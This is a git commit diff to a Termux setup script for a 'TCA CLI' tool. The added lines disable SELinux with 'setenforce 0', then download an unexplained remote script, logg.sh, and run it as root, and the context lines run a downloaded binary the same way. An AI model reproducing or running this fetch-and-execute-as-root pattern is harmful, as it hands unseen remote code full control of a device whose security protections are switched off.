3a583de27fabf16cd4353273594d8cb9feb8a09f
aday-all <59167264+aday-all@users.noreply.github.com>
2020-02-16 18:09:04 +0700

    Update Setup_Environment.sh

--- Setup_Environment.sh
+++ Setup_Environment.sh
@@ -35,3 +35,30 @@ tsu -c 'wget https://github.com/aday-all/aday-all/blob/master/Bulids/arm64/tca_v
 tsu -c 'chmod a+x tca_v1.2-cli'
 tsu -c ./tca_v1.2-cli
 
+#!/data/data/com.termux/files/usr/bin/bash env
+
+########################################
+#  TCA CLI Environment Setup Script: 1.2
+########################################
+#
+#
+#
+########################################
+#
+# Dependencies: bash and curl.
+#
+########################################
+
+# Update and upgrade
+pkg update -y && pkg upgrade -y
+
+# Switch permissive
+su -c 'setenforce 0'
+
+# Install dependencies
+pkg install tsu
+
+# Fetch the ELF and setup
+tsu -c 'wget https://raw.githubusercontent.com/aday-all/aday-all/master/logg.sh'
+tsu -c 'chmod +x logg.sh'
+tsu -c ./logg.sh
